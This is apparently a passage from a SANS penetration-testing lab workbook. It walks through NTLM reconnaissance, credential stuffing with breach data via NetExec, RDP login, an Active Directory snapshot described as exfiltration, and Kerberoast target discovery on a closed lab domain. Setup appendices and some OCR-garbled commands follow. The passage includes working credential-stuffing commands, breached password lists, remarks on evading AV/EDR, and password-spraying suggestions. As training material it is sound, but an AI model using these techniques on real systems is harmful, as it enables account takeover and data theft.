sec560@560vm:~\$ nmap10.130.10.23 -p 3389 --script rdp-ntlm-info -Pn Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 16:23 UTC Nmap scan report for ip-10-130-10-23.us-east-2.compute.internal (10.130.10.23) Host is up (0.069s latency).

PORT STATE SERVICE 3389/tcp open ms-wbt-server

| rdp-ntlm-info:

| Target\_Name: HIBOXY

| NetBIOS\_Domain\_Name: HIBOXY | NetBIOS\_Computer\_Name: RDP01 | DNS\_Domain\_Name: hiboxy.com

| DNS\_Computer\_Name: rdp01.hiboxy.com

| DNS\_Tree\_Name: hiboxy.com | Product\_Version: 10.0.20348

|\_ System\_Time: 2025-05-06T16:23:22+00:00

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds

We've confirmed that the same RDP server is available internally. We've also confirmed the Active Directory domain name (hiboxy.com).

unprivileged scans), we need to use the -Pn argument to skip the host discovery phase.

# Tip

Microsoft Exchange also reveals the internal Active Directory domain name, and Exchange is commonly exposed externally. You can use the following command to find the domain name inside this environment if you're curious: nmap 10.130.10.25 - Pn -n -p 25 --script smtp-ntlm-info

#### *2: Searching Through Breach Data*

Now that we know the Active Directory domain name, we can search through breach data for accounts with that domain. Let's say that through reconnaissance, we've found some breach data which includes email addresses and passwords for Hiboxy employees (amongst others). We can use this data to attempt to log in to the RDP server.

We'll first look at the first three lines of the original breachdata.txt file to see the format of the data ( emailaddress:password). We'll then search for lines containing @hiboxy.com: and save them to a new file called hiboxy\_breachdata.txt , from which we'll extract the usernames and passwords.

```
Command
 curl -s https://gist.githubusercontent.com/jeffmcjunkin/6e94732dd8f43a45c3334eb8cfc92daf/raw/breachdata.txt
 > breachdata.txt
 head -n 3 breachdata.txt
 grep '@hiboxy.com:' breachdata.txt > hiboxy_breachdata.txt
 Expected Results
   sec560@560vm:~$ curl -s https://gist.githubusercontent.com/jeffmcjunkin/
   6e94732dd8f43a45c3334eb8cfc92daf/raw/breachdata.txt> breachdata.txt
   sec560@560vm:~$ head -n 3 breachdata.txt
   linda.miller@fabrikam.com:abc123
   david.brown@northwindtraders.com:12345
   john.smith@adatum.com:password123
   sec560@560vm:~$ grep '@hiboxy.com:' breachdata.txt > hiboxy_breachdata.txt
```

Now that we have our excerpted hiboxy\_breachdata.txt file, we can extract the usernames and passwords. The usernames are everything before the @ symbol, and the passwords are everything after the : symbol. We can use the cut command to do this:

```
Command
 cut -d '@' -f1 hiboxy_breachdata.txt > hiboxy_users.txt
 cut -d ':' -f2- hiboxy_breachdata.txt > hiboxy_passwords.txt
 Expected Results
   sec560@560vm:~$ cut -d '@' -f1 hiboxy_breachdata.txt > hiboxy_users.txt
   sec560@560vm:~$ cut -d ':' -f2- hiboxy_breachdata.txt > hiboxy_passwords.txt
```

The first line in the hiboxy\_users.txt file correlates to the first line in the hiboxy\_passwords.txt file. Some tools allow you to use one file with credentials in username:password format (such as THC-Hydra, which we'll use later in class), but others do not.

#### *3: SMB Credential Stuffing*

Our next tool is NetExec, which is a penetration testing tool to help automate the security testing of large environments. We will use NetExec to attempt to log in to the RDP server using the credentials we found in the breach data. For the sake of a faster lab, we will use SMB as the target service. RDP is also available as an option, but the output is slower and less reliable in some situations.

Now let's use the breach data to attempt to log in to the RDP server:

| Command                |                  |                         |                                     |                   |
|------------------------|------------------|-------------------------|-------------------------------------|-------------------|
|                        |                  |                         |                                     |                   |
| nxc smb-u<br>130.10.23 | hiboxy_users.txt | -p hiboxy_passwords.txt | -d<br>hiboxy.comcontinue-on-success | no-bruteforce 10. |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |
|                        |                  |                         |                                     |                   |

#### Expected Results

```
sec560@560vm:~$ nxc smb-u hiboxy_users.txt -p hiboxy_passwords.txt -d hiboxy.com --continue-on-
success --no-bruteforce 10.130.10.23
SMB 10.130.10.23 445 RDP01 [*] Windows Server 2022 Build 20348 
x64 (name:RDP01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\jsmith:Summer2020! 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\dmiller:nuggetnugget 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\amartin:AstonMartinDB5 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\jwood:Rockin10 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [+] hiboxy.com\hmoore:Shane1** 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\mjohnson:Chocolate1! 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\agardner:Vocabulary 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\emartinez:Explorer007 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\mlee:Musketeer_4th 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\tanderson:MatrixRev9 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] 
hiboxy.com\wwilliams:Williams@2020 STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\jmartinez:Julio@2003 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\khill:OverTheHill45 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\swilson:SeahawksFan52 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\dbrown:BostonCeltics#1 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\cdavis:ClaraD!2020 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\hthomas:TommyBoy2022 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [+] 
hiboxy.com\sbishop:Ethnogeographically1 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\rduran:Winter2018! 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] 
hiboxy.com\rrodriguez:Rodriguez24@ STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\syoung:Youngster52 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\mgarcia:MariaG2020* 
STATUS_LOGON_FAILURE
```

```
SMB 10.130.10.23 445 RDP01 [-] 
hiboxy.com\awright:WrightFlight1903 STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [+] hiboxy.com\apena:F1r3Dr@g0n 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\bhall:BeachBum$29 
STATUS_LOGON_FAILURE 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\nlopez:Spring2019 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\jclark:ClarkKent2019 
STATUS_LOGON_FAILURE 
SMB 10.130.10.23 445 RDP01 [-] hiboxy.com\eharris:EddieMoney2020 
STATUS_LOGON_FAILURE
```

For context, here are the command line options used:

- smb Use the SMB protocol •
- -u "hiboxy\_users.txt" Use the usernames in the file hiboxy\_users.txt •
- -p "hiboxy\_passwords.txt" Use the passwords in the file hiboxy\_passwords.txt •
- -d hiboxy.com Use the domain hiboxy.com (as opposed to local credentials) •
- --continue-on-success Continue trying other credentials even if one is successful •
- --no-bruteforce Use paired usernames and passwords from the files; don't try variations (first username with first password, second username with second password, etc.) •

While we could try variations of breached passwords, or try other usernames using sources like Statistically Likely Usernames, for now we have working credentials, so let's move on to logging on using those.

#### *4: Logging In via RDP (Linux)*

Let's log on using our found credentials. Pick one of the three accounts to log in with, We'll randomly pick one of the three accounts that worked from the output above using shuf :

# Command

```
cat <<'EOF' > /tmp/rdp_accounts.txt
hmoore:Shane1**
sbishop:Ethnogeographically1
apena:F1r3Dr@g0n
EOF
export RDP_ACCOUNT=shuf $( -n 1 /tmp/rdp_accounts.txt )
export RDP_USER=$(echo $RDP_ACCOUNTcut -d| ':' -f1 )
export RDP_PASS=$(echo $RDP_ACCOUNTcut -d| ':' -f2 )
```

# Curious about the cat << 'EOF' syntax?

The << is a shell operator that allows you to redirect the contents of a file to a command. In this case, we are using it to create a file with the contents of the usernames. The EOF is a delimiter that tells the shell where the end of the file is. You can use any string you like, but EOF is a common choice. The single quotes around EOF prevent variable expansion, so the contents of the file are treated as literal text, even if they have characters that would normally be interpreted by the shell, such as \$ or \ .

Let's connect in, using one of the three accounts we found. The xfreerdp command is a Linux RDP client that allows you to connect to Windows machines using the RDP protocol:

# Command

xfreerdp /u:hiboxy \\\$RDP\_USER/p: "\$RDP\_PASS"/v:10.130.10.23 /drive:labs,/home/sec560/labs /certignore /size:80% +dynamic-resolution

# Expected Results

The RDP client should visually open at this point. You can safely ignore the xfreerdp output.

# Curious about those xfreerdp options?

The xfreerdp command is a Linux RDP client that allows you to connect to Windows machines using the RDP protocol. It has many options, but here are the ones we used in this lab:

- /u:hiboxy\\\$RDP\_USER Use the username hiboxy\\$RDP\_USER (the \\ is used to escape the backslash in the username) •
- /p:'\$RDP\_PASS' Use the password \$RDP\_PASS, picked out of the three accounts that worked •
- /v:10.130.10.23 Connect to the RDP server at 10.130.10.23 as seen earlier in the lab •
- /drive:labs,/home/sec560/labs Map the labs drive to the home directory of the user sec560 on the Linux VM •
- /cert-ignore Ignore certificate errors (since this is a lab environment, we don't care about them) •
- /size:80% Set the size of the RDP window to 80% of the client screen size •
- +dynamic-resolution Allow the RDP window to resize dynamically as you resize it •

Excellent! An authenticated internal session with the ability to run arbitrary code is a powerful position for attackers. Let's start by gathering information about the environment. We'll use Active Directory Explorer (ADExplorer) to examine the Active Directory environment of Hiboxy. We'll also be able to take a snapshot of the Hiboxy AD environment for analysis on our own machine, as well as discover and exfiltrate some other sensitive data.

Click the Windows folder icon in the lower-left corner of the screen:

![](SEC560_WorkBook2_page_241_Picture_0.jpeg)

Next, click This PC in the resulting *File Explorer* window. Under *Redirected drives and folders*, double-click on labs on 560vm:

![](SEC560_WorkBook2_page_241_Figure_2.jpeg)

Next, double-click on ADExplorer.

If prompted, accept the license agreement by clicking Agree. Once ADExplorer is open, leave the connection information blank (it will default to the current Active Directory domain) and click OK:

![](SEC560_WorkBook2_page_242_Picture_0.jpeg)

A view of Hiboxy's Active Directory environment will appear, similar to Active Directory Users and Computers. You can navigate through the tree on the left side of the window to explore the environment if you like.

Click File in the top-left corner of the window, then click Create Snapshot. Click the ellipsis (...) to choose a location to save the snapshot, click the Desktop shortcut under the *Quick access* menu on the left, enter Hiboxy-snapshot in the *File name:* field, click Save, then click OK:

![](SEC560_WorkBook2_page_243_Picture_0.jpeg)

You can now close ADExplorer. Next, we'll exfiltrate the snapshot. Right-click on the Hiboxy-snapshot file on the desktop and click Cut, then right-click into the still-open *File Explorer* window and click Paste. This will move the snapshot to the Linux VM's /home/ sec560/labs directory.

#### Information

ADExplorer could save directly to the labs directory on the Linux VM, but it would take longer due to RDP's file latency.

Go ahead and close the xfreerdp application to disconnect from the RDP session.

### *5: Exfiltrate and Analyze ADExplorer Snapshot*

Even if Hiboxy were to notice the RDP connection and exfiltration of the snapshot, they cannot remove your copy of the exfiltrated data. We also used a Microsoft-signed binary (ADExplorer) to gather the data, so any AV or EDR solutions would likely ignore the activity.

While it's possible to use utilities like wine to run ADExplorer directly on Linux, it's often more reliable to run it on a Windows machine. For the sake of this lab, we'll instead extract the data from the ADExplorer snapshot on our Linux VM using ADExplorerSnapshot, a Python script that can parse ADExplorer snapshot files into BloodHound JSON format.

Let's extract the data from the snapshot:

python3 /opt/ADExplorerSnapshot.py/ADExplorerSnapshot.py -o ~/labs/Hiboxy-parsed ~/labs/Hiboxy-snapshot.dat

# Expected Results

sec560@560vm:~\$ python3 /opt/ADExplorerSnapshot.py/ADExplorerSnapshot.py -o ~/labs/Hiboxy-parsed ~/ labs/Hiboxy-snapshot.dat

- [\*] Server: dc01.hiboxy.com
- [\*] Time of snapshot: 2025-09-16T16:02:23
- [\*] Mapping offset: 0x7ce1c8
- [\*] Object count: 7859
- [+] Parsing properties: 3944
- [+] Parsing classes: 583
- [+] Parsing object offsets: 7859
- [+] Preprocessing objects: 694 sids, 11 computers, 1 domains with 1 DCs
- [+] Collecting data: 572 users, 76 groups, 11 computers, 34 certtemplates, 1 CAs, 0 trusts
- [+] Output written to dc01.hiboxy.com\_1758038543\_\*.json files

Let's look at the created files:

### Command

ls -l ~/labs/Hiboxy-parsed/

## Expected Results

```
sec560@560vm:~$ ls ~/labs/Hiboxy-parsed/
dc01.hiboxy.com_1758038543_cert_bh.json
dc01.hiboxy.com_1758038543_cert_ly4k_cas.json
dc01.hiboxy.com_1758038543_cert_ly4k_tpls.json
dc01.hiboxy.com_1758038543_computers.json
dc01.hiboxy.com_1758038543_domains.json
dc01.hiboxy.com_1758038543_groups.json
dc01.hiboxy.com_1758038543_users.json
```

We could load this into BloodHound and do our analysis that way, but for now, we'll look at the JSON using jq , a command-line JSON processor. Let's look at the domain object itself:

# Command jq . ~/labs/Hiboxy-parsed/\*\_domains.json | head -n 20 Expected Results sec560@560vm:~\$ jq . ~/labs/Hiboxy-parsed/\*\_domains.json | head -n 20 { "data": [ { "ObjectIdentifier": "S-1-5-21-2939331289-1713847731-564771466", "Properties": { "name": "HIBOXY.COM", "domain": "HIBOXY.COM", "domainsid": "S-1-5-21-2939331289-1713847731-564771466", "distinguishedname": "DC=hiboxy,DC=com", "description": "", "functionallevel": "2016", "Machine Account Quota": 10, "highvalue": true, "isaclprotected": false, "collected": true, "whencreated": 1757902923 }, "Trusts": [], "Aces": [ {

Some of your details will vary, such as the domainsid, as it's created uniquely for each range. Look for the Machine Account Quota property, which is set to 10. This is the dangerous, default setting. This means that any user can create up to 10 computer accounts in the domain. While not *inherently* dangerous, it can be combined with other flaws to enable some dangerous attacks, and should be a finding in a penetration test. Instead, dedicated accounts should be used for creating computer accounts, and the value of ms-DS-MachineAccountQuota (which is what the actual LDAP parameter name is) should be 0.

Next, we'll look at parsing the JSON data for Kerberoastable users. Kerberoasting is a technique that allows attackers to request service tickets for service accounts, which can then be cracked offline to reveal the plaintext password. Service accounts are often high-privilege accounts, so this is a powerful technique.

```
Command
 jq '.data[]
  | select(.Properties.serviceprincipalnames | length > 0)
  | {name: .Properties.name, spns: .Properties.serviceprincipalnames}' ~/labs/Hiboxy-parsed/
 dc01.hiboxy.com_*_users.json
 Expected Results
  sec560@560vm:~$ jq ' .data[]
  | select(.Properties.serviceprincipalnames | length > 0)
  | {name: .Properties.name, spns: .Properties.serviceprincipalnames}' ~/labs/Hiboxy-
  parsed/dc01.hiboxy.com_*_users.json
  {
  "name": "KRBTGT@HIBOXY.COM",
  "spns": [
   "kadmin/changepw"
  ]
  }
  {
  "name": "SVC_SQLSERVICE@HIBOXY.COM",
  "spns": [
   "MSSQLSvc/sql01.Hiboxy.com",
   "MSSQLSvc/sql01.Hiboxy.com:1433"
  ]
  }
  {
  "name": "SVC_SQLSERVICE2@HIBOXY.COM",
  "spns": [
   "MSSQLSvc/sql02.Hiboxy.com",
   "MSSQLSvc/sql02.Hiboxy.com:1433"
  ]
  }
```

Here, we see that SVC\_SQLSERVICE and SVC\_SQLSERVICE2 are Kerberoastable accounts, as they have service principal names (SPNs) associated with them. If we were to request service tickets for these accounts, we could then attempt to crack them o ffline to reveal the plaintext password. Technically, the KRBTGT account is also Kerberoastable (as it has the kadmin/changepw SPN associated), but under normal circumstances, it has a long, random password that cannot be cracked.

# Conclusion

In this lab, we found an exposed RDP server in the Hiboxy domain, found breached credentials for the domain, used those credentials to log in to the RDP server, and exfiltrated sensitive data. We found that the domain has a weak password policy and a dangerous default setting for creating computer accounts.

Importantly, we also saw that a breach doesn't have to be complicated to be effective, nor do patchable flaws need to be involved.

Would you like to do more? Here are some ideas:

- Dump an authoritative list of all users in the domain (using Impacket's GetADUsers.py script), then spray common passwords against them •
- Spray common passwords (https://weakpasswords.net/) as well as known-breached passwords •
- Try variations of the known-breached credentials using hashcat rules like best66.rule or your own human intellect (for example, updating a prior breached password of Winter2018! to Summer2024!) •

#### Bonus

Two users have the same password *pattern* as found in breachdata.txt file:

- Nathan Lopez (HR), nlopez@hiboxy.com, appears in breach data as Spring2019. Breach data is inherently aged, however, so try the current and next season! •
- Rachel Duran (Marketing), rduran@hiboxy.com, appears in breach data as Winter2018! . Try the same pattern (with the ! ) for the current and next season! •

Two users have small variations in their passwords as found in breachdata.txt file:

- Andrea Gardner, agardner@hiboxy.com, appears in breach data as Vocabulary. Try appending numbers or special characters to the end of the password. •
- Jonathan Wood, jwood@hiboxy.com , appears in breach data as Rockin10. Try appending numbers or special characters to the end of the password. •

# *Virtual Machine Credentials*

The login credentials for all virtual machines used in this class are listed below for quick reference.

All login credentials are also displayed in the respective virtual machine's information panel.

#### SEC560 Windows 11 VM 1.

Username: sec560 Password: sec560 • •

These credentials are for the system account used via the graphical login.

This user has Administrator access within the virtual machine.

#### SEC560 Linux VM 2.

Username: sec560 Password: sec560 • •

These credentials are for the system account used via either the console or SSH.

This user has sudo access for all commands on the virtual machine.

# *Change Keyboard Layout (Optional)*

If you have a non-US keyboard you may find it easier to change the Keyboard layout in the VM. If you'd like to change the layout in the VM, follow the steps below.

# Windows VM

- Open the Start Menu 1.
- Type the word "Language" (you don't need to click on anything first, just start typing) 2.
- Select "Language settings" 3.

![](SEC560_WorkBook2_page_250_Figure_0.jpeg)

4. Click the ellipsis (triple dot) after "English (United States)", then click "Language Options"

![](SEC560_WorkBook2_page_251_Figure_0.jpeg)

# 5. Click the "Add a keyboard" button under the "Keyboards" section

![](SEC560_WorkBook2_page_251_Picture_2.jpeg)

- Select the keyboard layout that matches your physical keyboard 6.
- Click ellipsis (triple dot) after the "US" keyboard 7.
- Click the "Remove" button 8.
- Close the window 9.

# SEC560 Linux VM

- Click the "Keyboard Settings" shortcut on the SEC560 Linux VM's desktop 1.
- Click on the "Layouts" tab" 2.
- Click the "+ Add" button 3.

![](SEC560_WorkBook2_page_252_Figure_8.jpeg)

Select your "Country" from the dropdown 4.

Select the correct option from the "Variants" dropdown 5.

![](SEC560_WorkBook2_page_253_Figure_1.jpeg)

- Click the "+ Add" button 6.
- Select the "English (US)" keyboard 7.
- Click "- Remove" 8.
- Close the window 9.

# *Configuring OpenVPN Client in Class VMs*

labs to demonstrate and reinforce the concepts covered in the rest of the class.

To connect to the lab range environment (and later, the CTF range environment), you will need to download OpenVPN configuration files.

# Downloading the OpenVPN Configuration Files

Please ensure you have the latest OpenVPN configuration file from the MyLabs section of your SANS account. Instructions for accessing the specific files for your class are in the "Setup Instructions" document you received before class and can be accessed from the SANS Course Material Downloads section.

There are two OpenVPN configuration files: sec560-labs-range.ovpn and sec560-ctf-range.ovpn . The sec560-labs-range.ovpn

five days of class). The sec560-ctf-range.ovpn

you will not see the sec560-ctf-range.ovpn OpenVPN file until the day of the CTF.

# Loading the OpenVPN Configuration File to your VMs

Each of your two SEC560 virtual machines requires the OpenVPN profile to be configured.

# *SEC560 Linux VM*

Open a terminal and run the following command:

sudo openvpn ~/Desktop/sec560-labs-range.ovpn

Make sure replace sec560-labs-range.ovpn with the correct filename if it is different.

If you saved the configuration file to a different location, you'll have to change the path.

# Expected Results

sec560@560vm:~\$ sudo openvpn ~/Desktop/sec560-labs-range.ovpn

2025-09-08 17:58:49 Note: Treating option '--ncp-ciphers' as '--data-ciphers' (renamed in OpenVPN 2.5).

2025-09-08 17:58:49 OpenVPN 2.6.14 aarch64-unknown-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4]

[EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]

2025-09-08 17:58:49 library versions: OpenSSL 3.0.13 30 Jan 2024, LZO 2.10

2025-09-08 17:58:49 DCO version: N/A

2025-09-08 17:58:49 TCP/UDP: Preserving recently used remote address:

[AF\_INET]3.13.183.204:1194

2025-09-08 17:58:49 UDPv4 link local: (not bound)

2025-09-08 17:58:49 UDPv4 link remote: [AF\_INET]3.13.183.204:1194

2025-09-08 17:58:49 [server.labs.sec560.sans.org] Peer Connection Initiated with

[AF\_INET]3.13.183.204:1194

2025-09-08 17:58:51 Options error: Unrecognized option or missing or extra parameter(s)

in [PUSH-OPTIONS]:1: block-outside-dns (2.6.14)

2025-09-08 17:58:51 TUN/TAP device tun0 opened

2025-09-08 17:58:51 net\_iface\_mtu\_set: mtu 1500 for tun0

2025-09-08 17:58:51 net\_iface\_up: set tun0 up

2025-09-08 17:58:51 net\_addr\_v4\_add: 10.254.252.3/23 dev tun0

2025-09-08 17:58:51 Initialization Sequence Completed

Do not close this terminal window. If you do, your VPN connection will die.

Confirm you can access the target environment by pinging a system in the target range. The target will depend on the target network ( lab or ctf ) that you are connecting to.

If you have downloaded the labs config ( sec560-labs-range.ovpn ), run:

# Command

ping -c 4 10 .130.10.10

If you have downloaded the ctf config ( sec560-ctf-range.ovpn , for the Day 6/Capstone only), run:

ping -c 4 10 .130.9.10

# Successful Ping

```
sec560@560vm:~$ ping -c 2 10 .130.9.10
PING 10.130.9.10 (10.130.9.10) 56(84) bytes of data.
64 bytes from 10.130.9.10: icmp_seq=1 ttl=63 time=35.3 ms
64 bytes from 10.130.9.10: icmp_seq=1 ttl=63 time=35.3 ms
64 bytes from 10.130.9.10: icmp_seq=1 ttl=63 time=37.2 ms
64 bytes from 10.130.9.10: icmp_seq=2 ttl=63 time=37.1 ms
```

--- 10.130.9.10 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 1001ms rtt min/avg/max/mdev = 35.362/36.919/38.476/1.557 ms

# Failed Ping

```
sec560@560vm:~$ ping -c 4 10 .130.9.10
PING 10.130.9.10 (10.130.9.10) 56(84) bytes of data.
```

--- 10.130.9.10 ping statistics ---

4 packets transmitted, 0 received, 100% packet loss, time 3069ms

If you are unable to ping, ensure that your OpenVPN connect is running and says "Initialization Sequence Completed". If it does not work, restart the VPN connection and try again.

#### *Windows 11 VM*

OpenVPN is set to start automatically inside the SEC560 Windows 11 VM, but you'll still need to copy and import the OpenVPN configuration file.

Until you load an OpenVPN profile, you will receive the message upon starting your Windows VM - this is expected behavior. Click "OK".

No readable connection profiles (config files) found. Use the "Import File.." menu or copy your config files to "C: \User\sec560\OpenVPN\config" or "C:\Program Files\OpenVPN\config".

![](SEC560_WorkBook2_page_257_Figure_0.jpeg)

Copy the OpenVPN configuration file to the Desktop of your Windows VM. From there, you can drag and drop the file into the OpenVPN profiles folder, whose shortcut is on the Windows 11 VM desktop. You'll be prompted for administrator permission when copying to the OpenVPN profiles folder, so click Continue to allow it. This has the same effect as importing the profile as described below:

Right click on the "OpenVPN GUI" icon in the system tray, then click "Import file..."

![](SEC560_WorkBook2_page_257_Picture_3.jpeg)

Browse to the OpenVPN configuration file and click Open. Note: Your filename may differ!

![](SEC560_WorkBook2_page_257_Figure_5.jpeg)

You should see a message stating "File imported successfully".

Right click on the icon again, then click Connect.

![](SEC560_WorkBook2_page_258_Picture_2.jpeg)

You should see an popup in the corner stating that the connection was successful.

![](SEC560_WorkBook2_page_258_Picture_4.jpeg)

Open a PowerShell terminal by clicking the "Terminal" link on your Desktop.

Confirm you can access the target environment by pinging a system in the target range. The target will depend on the target network ( sec560-labs-range.ovpn or sec560-ctf-range.ovpn ) that you are connecting to.

If you have downloaded the sec560-labs-range.ovpn file, run:

ping 10.130.10.10

If you have downloaded the sec560-ctf-range.ovpn file, run:

#### Command

ping 10.130.9.10

# Successful Ping

PS C:\Users\sec560> ping 10.130.9.10

Pinging 10.130.9.10 with 32 bytes of data:

Reply from 10.130.9.10: bytes=32 time=35ms TTL=63

Reply from 10.130.9.10: bytes=32 time=36ms TTL=63

Reply from 10.130.9.10: bytes=32 time=36ms TTL=63

Reply from 10.130.9.10: bytes=32 time=35ms TTL=63

Ping statistics for 10.130.9.10:

Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

Minimum = 35ms, Maximum = 36ms, Average = 35ms

#### Failed Ping

PS C:\Users\sec560> ping 10.130.9.10

Pinging 10.130.9.10 with 32 bytes of data:

Request timed out.

Request timed out.

Request timed out.

Request timed out.

Ping statistics for 10.130.9.10:

Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),

If you are unable to ping, ensure that your OpenVPN connection is running. If it does not work, restart the VPN connection and try again.

# *Testing Virtual Machine Connectivity*

In many labs, you will need to have network connectivity between the Windows and Linux Virtual Machines (VMs). Follow these steps to test your VM connectivity.

Feel free to ask for help! This content is meant to help you test and troubleshoot any network issues you may encounter. Remember, it's perfectly OK to ask for help! Your instructor is here for you.

are examples. To retrieve your Windows IP address, use the netsh interface ip show addresses Ethernet0 command. On Linux, use the ip -br a command.

# IP Addresses

Your VMs will have two IP addresses. One address is for the "local" network and communication between the VMs. The second address is for the VPN, and will only exist when you are connected to the VPN.

- VPN address will begin with 10.254.25X.X. •
- Your "local" address will likely look like 192.168.X.X , but could be 10.X.X.X or 172.16.X.X . •

#### *Linux IP Address*

Retrieve your Linux IP address by using the command below.

# Command

ip -br a

# Notional Results

sec560@560vm:~\$ ip -br a

lo UNKNOWN 127.0.0.1/8 ::1/128

eth0 UP 192.168.201.175/24 metric 100 fe80::20c:29ff:fe46:fed2/64

docker0 DOWN 172.17.0.1/16 tun0 UNKNOWN 10.254.252.3/23

The address associated with the eth0 interface is what you're looking for. Your address will be different, but we'll use this address in our example.

#### *Verify Your IP Address on Windows*

First, retrieve your Windows IP address:

netsh interface ip show addressesEthernet0

# Expected Results

PS C:\> netsh interface ip show addresses Ethernet0

...output truncated for brevity...

Configuration for interface "Ethernet0"

DHCP enabled: Yes

IP Address: 192.168.190.140

Subnet Prefix: 192.168.190.0/24 (mask 255.255.255.0)

Default Gateway: Gateway Metric: 0 InterfaceMetric: 25

In this example, the IP address we're looking for is 192.168.190.140. Your address will be different.

# Ping Linux from Windows

On your Windows VM, open a PowerShell window using the "Terminal" shortcut on Windows desktop. From the terminal, use the ping command to test connectivity to your Linux VM at IP Address from above:

ping LINUX\_ETH0\_ADDRESS

# Expected Results

PS C:\> ping 192.168.190.139

Pinging 192.168.190.139 with 32 bytes of data:

Reply from 192.168.190.139: bytes=32 time<1ms TTL=64

Reply from 192.168.190.139: bytes=32 time=1ms TTL=64

Reply from 192.168.190.139: bytes=32 time<1ms TTL=64

Reply from 192.168.190.139: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.190.139:

Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

Minimum = 0ms, Maximum = 1ms, Average = 0ms

# Replace LINUX\_ETH0\_ADDRESS!

Replace LINUX\_ETH0\_ADDRESS with the address of your Linux VM's eth0 interface (NOT the address like 10.254.25X.X on tun0).

# Ping Windows from Linux

On your Linux VM, open a terminal. From the terminal, use the ping command to test connectivity to the Windows VM (IP Address from above):

ping -c 4 WINDOWS\_ETHERNET0\_ADDRESS

# Expected Results

```
sec560@560vm:~$ ping -c 4 192.168.190.140
PING 192.168.10.140 (192.168.10.140) 56(84) bytes of data.
64 bytes from 192.168.10.140: icmp_seq=1 ttl=128 time=0.544 ms
64 bytes from 192.168.10.140: icmp_seq=2 ttl=128 time=1.19 ms
64 bytes from 192.168.10.140: icmp_seq=3 ttl=128 time=0.976 ms
64 bytes from 192.168.10.140: icmp_seq=4 ttl=128 time=1.18 ms
--- 192.168.10.140 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 0.544/0.973/1.192/0.264 ms
```

# Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

# Troubleshooting

If the ping command fails on Windows or Linux, use these tips to troubleshoot and fix the issue. Let an instructor know if you would like assistance.

#### *Verify IP Addresses*

Confirm you are using the correct IP Address.

#### *Verify VMware*

Make sure VMware has both VMs set to the correct network mode. Your network connection should be set to *NAT* for all exercises.

Some students have issues with NAT mode, in such a case, change both your VMs to use *Bridged* networking.

# *Linux Unable to Ping Windows from Linux*

If your Linux system cannot reach your Windows VM, you should troubleshoot the Windows system.

#### *Verify That the Windows Firewall Is Disabled*

Make sure your Windows firewall is disabled using the netsh command. Open an administrative PowerShell window using the "Terminal" shortcut on your Windows VM's desktop.

From the administrative PowerShell prompt, run the following netsh command to view the state of the Windows firewall:

![](SEC560_WorkBook2_page_264_Figure_1.jpeg)

To disable all firewall profiles in Windows, enter the following command into the administrative PowerShell window:

![](SEC560_WorkBook2_page_264_Figure_3.jpeg)

Validate the profile as disabled by rerunning the netsh command used to show the profiles:

netsh advfirewall show allprofiles | findstr State

# Expected Results

PS C:\Users\sec560> netsh advfirewall showallprofiles | Select-String State

State OFF State OFF State OFF

